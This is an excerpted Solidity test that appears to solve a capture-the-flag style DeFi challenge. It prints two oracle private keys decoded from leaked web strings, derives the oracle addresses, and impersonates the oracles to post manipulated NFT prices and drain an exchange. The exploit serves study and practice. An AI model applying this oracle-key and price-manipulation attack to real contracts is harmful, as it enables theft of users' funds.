...
contract Compromised is Test {
    ...
    function testExploit() public {
        ...
        // Create two oracle account with below private keys . These keys were
        // found by converting hex string found on vulnerable defi app web and then convering
        // them to UTF-8 . And then finally deocoding using bas64 decoder.

        // Here are the resulting private keys .
        //0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        //0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48

        address oracleOne = vm.addr(
            0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        );
        address oracleTwo = vm.addr(
            0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
        );

        // update nft median price to 0
        vm.prank(oracleOne);
        ...
        // update nft price to EXCHANGE_INITIAL_ETH_BALANCE
        vm.prank(oracleOne);
        trustfulOracle.postPrice("DVNFT", 9990e18);
        ...
        // update median nft price to Initial Price
        vm.prank(oracleOne);
